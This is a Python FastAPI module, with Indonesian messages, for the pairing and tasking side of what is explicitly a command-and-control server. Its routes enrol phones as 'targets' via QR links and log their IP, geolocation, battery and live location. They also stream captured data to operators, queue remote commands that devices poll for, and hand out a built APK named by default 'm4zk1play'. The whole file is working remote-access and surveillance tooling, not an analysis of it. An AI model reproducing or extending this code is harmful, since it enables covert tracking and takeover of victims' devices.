"""QR pairing: web agent tanpa install + distribusi APK."""
from __future__ import annotations

import io
import json
import secrets
import time
import uuid
from pathlib import Path
from urllib.parse import quote

from fastapi import APIRouter, Depends, HTTPException, Request
from fastapi.responses import (FileResponse, HTMLResponse, RedirectResponse, Response)

from . import config, db, ipgeo, security
from .ws import hub

router = APIRouter()
MODES = {"web", "apk", "ios"}


def _base(request: Request) -> str:
    conf = str(config.get("c2_public_url") or "").strip().rstrip("/")
    return conf or str(request.base_url).rstrip("/")


def _url_for(request: Request, row) -> str:
    base = _base(request)
    if row["mode"] == "apk":
        return f"{base}/api/pair/apk/{row['token']}"
    return f"{base}/p/{row['token']}"


@router.post("/api/pair/new")
async def new_pair(request: Request, body: dict,
                   _: str = Depends(security.require_operator)) -> dict:
    mode = str(body.get("mode") or "web")
    if mode not in MODES:
        raise HTTPException(400, "mode tidak dikenal")
    try:
        ttl = int(body.get("ttl") or 900)
    except (TypeError, ValueError):
        ttl = 900
    ttl = max(120, min(ttl, 86400))
    token = secrets.token_hex(8)
    now = time.time()
    db.x(
        "INSERT INTO pairs(id,token,mode,label,created,expires) VALUES(?,?,?,?,?,?)",
        (uuid.uuid4().hex[:10], token, mode, str(body.get("label") or "")[:120], now, now + ttl),
    )
    row = db.one("SELECT * FROM pairs WHERE token=?", (token,))
    url = _url_for(request, row)
    db.audit("pair_baru", f"{mode} :: {token}")
    return {"ok": True, "token": token, "url": url, "qr": f"/api/pair/qr/{token}.svg", "ttl": ttl}


@router.get("/api/pair/qr/{token}.svg")
async def qr_svg(token: str, request: Request):
    row = db.one("SELECT * FROM pairs WHERE token=?", (token,))
    if row is None:
        raise HTTPException(404, "kode tidak dikenal")
    url = _url_for(request, row)
    try:
        import qrcode
        import qrcode.image.svg

        img = qrcode.make(url, image_factory=qrcode.image.svg.SvgPathImage,
                          box_size=12, border=2)
        buf = io.BytesIO()
        img.save(buf)
        return Response(buf.getvalue(), media_type="image/svg+xml",
                        headers={"Cache-Control": "no-store"})
    except Exception:
        return RedirectResponse(
            "https://api.qrserver.com/v1/create-qr-code/?size=420x420&data=" + quote(url)
        )


@router.get("/p/{token}", response_class=HTMLResponse)
async def agent_page(token: str) -> HTMLResponse:
    row = db.one("SELECT * FROM pairs WHERE token=?", (token,))
    if row is None or float(row["expires"]) < time.time():
        return HTMLResponse(
            "<body style='background:#07080a;color:#ff2d55;font-family:monospace;"
            "padding:26px'><h3>Kode pairing tidak valid / kedaluwarsa.</h3>"
            "<p style='color:#7b8798'>Minta operator membuat QR baru.</p></body>",
            status_code=410,
        )
    page = (config.WEB_DIR / "p.html").read_text(encoding="utf-8")
    return HTMLResponse(page.replace("{{TOKEN}}", token))


@router.post("/api/pair/claim")
async def claim(request: Request, body: dict) -> dict:
    token = str(body.get("token") or "")
    row = db.one("SELECT * FROM pairs WHERE token=?", (token,))
    if row is None:
        raise HTTPException(404, "kode tidak valid")
    if float(row["expires"]) < time.time():
        raise HTTPException(410, "kode kedaluwarsa")

    info = body.get("info") or {}
    ip = security.client_ip(request)
    geo = await ipgeo.lookup(ip)
    now = time.time()
    tid = row["target_id"] or uuid.uuid4().hex[:10]

    if row["target_id"]:
        db.x(
            "UPDATE targets SET ip=?,isp=?,country=?,city=?,lat=?,lon=?,online=1,"
            "last_seen=?,battery=?,source='web' WHERE id=?",
            (ip, geo.get("isp", ""), geo.get("country", ""), geo.get("city", ""),
             geo.get("lat"), geo.get("lon"), now, int(info.get("battery") or 0), tid),
        )
    else:
        db.x(
            "INSERT INTO targets(id,token,label,brand,model,android,sdk,ip,isp,country,city,"
            "lat,lon,battery,charging,storage_free,hidden,online,first_seen,last_seen,notes,source)"
            " VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,0,1,?,?,?,'web')",
            (tid, f"web-{token}", str(info.get("label") or info.get("model") or "Web Target")[:80],
             str(info.get("brand") or ""), str(info.get("model") or ""),
             str(info.get("android") or ""), int(info.get("sdk") or 0), ip,
             geo.get("isp", ""), geo.get("country", ""), geo.get("city", ""),
             geo.get("lat"), geo.get("lon"), int(info.get("battery") or 0),
             1 if info.get("charging") else 0, int(info.get("storage_free") or 0),
             now, now, str(info.get("platform") or "")),
        )
        db.audit("pair_web", f"{tid} :: {info.get('model', '?')} :: {ip}")

    db.x("UPDATE pairs SET target_id=?, used=1, ip=?, ua=? WHERE token=?",
         (tid, ip, request.headers.get("user-agent", "")[:240], token))
    await hub.to_operators({"t": "targets_dirty"})
    return {"ok": True, "target": tid}


@router.post("/api/pair/beat")
async def beat(body: dict) -> dict:
    tid = str(body.get("target") or "")
    if not tid:
        raise HTTPException(400, "target kosong")
    now = time.time()
    db.x(
        "UPDATE targets SET online=1,last_seen=?,battery=?,"
        "lat=COALESCE(?,lat),lon=COALESCE(?,lon) WHERE id=?",
        (now, int(body.get("battery") or 0), body.get("lat"), body.get("lon"), tid),
    )
    lat, lon = body.get("lat"), body.get("lon")
    if lat is not None and lon is not None:
        await hub.to_operators(
            {"t": "stream", "target": tid, "kind": "loc", "meta": {"lat": lat, "lon": lon}})
    return {"ok": True}


@router.post("/api/pair/stream")
async def stream(body: dict) -> dict:
    await hub.to_operators({
        "t": "stream", "target": body.get("target"), "kind": body.get("kind"),
        "b64": body.get("b64"), "meta": body.get("meta"),
    })
    return {"ok": True}


@router.get("/api/pair/cmd/{token}")
async def poll_cmd(token: str) -> dict:
    row = db.one("SELECT target_id FROM pairs WHERE token=?", (token,))
    if row is None or not row["target_id"]:
        return {"commands": []}
    rows = db.q(
        "SELECT id,type,args FROM commands WHERE target_id=? AND status='queued'"
        " ORDER BY created LIMIT 12", (row["target_id"],))
    for r in rows:
        db.x("UPDATE commands SET status='sent',updated=? WHERE id=?", (time.time(), r["id"]))
    return {"commands": [
        {"id": r["id"], "type": r["type"], "args": json.loads(r["args"] or "{}")} for r in rows]}


@router.post("/api/pair/result")
async def result(body: dict) -> dict:
    cid = body.get("id")
    db.x("UPDATE commands SET status=?,result=?,updated=? WHERE id=?",
         ("done" if body.get("ok") else "error",
          json.dumps(body.get("data"))[:60000], time.time(), cid))
    await hub.to_operators({
        "t": "result", "id": cid, "target": body.get("target"),
        "ok": bool(body.get("ok")), "data": body.get("data"),
    })
    return {"ok": True}


@router.get("/api/pair/apk/{token}")
async def apk(token: str):
    row = db.one("SELECT * FROM pairs WHERE token=?", (token,))
    if row is None:
        raise HTTPException(404, "kode tidak valid")
    b = db.one("SELECT * FROM builds WHERE status='selesai' AND outfile IS NOT NULL"
               " ORDER BY created DESC LIMIT 1")
    if b is None or not b["outfile"] or not Path(b["outfile"]).exists():
        raise HTTPException(404, "belum ada APK siap, build dulu di halaman BUILD")
    return FileResponse(
        b["outfile"], filename=f"{b['name'] or 'm4zk1play'}.apk",
        media_type="application/vnd.android.package-archive")


@router.get("/api/pair/list")
async def listing(_: str = Depends(security.require_operator)) -> dict:
    rows = db.q("SELECT * FROM pairs ORDER BY created DESC LIMIT 80")
    return {"pairs": [dict(r) for r in rows]}


@router.delete("/api/pair/{pair_id}")
async def drop(pair_id: str, _: str = Depends(security.require_operator)) -> dict:
    db.x("DELETE FROM pairs WHERE id=?", (pair_id,))
    return {"ok": True}
